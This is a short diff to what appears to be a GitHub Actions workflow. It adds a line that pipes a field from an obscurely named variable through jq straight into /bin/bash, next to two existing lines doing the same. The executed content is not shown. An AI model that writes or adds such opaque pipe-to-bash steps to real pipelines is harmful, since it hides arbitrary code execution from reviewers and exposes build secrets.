@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$ep3" | jq -r .dx5825 | /bin/bash
           printf '%s' "$p35086" | jq -r .lb2417 | /bin/bash
+          printf '%s' "$d47" | jq -r .axgx7 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
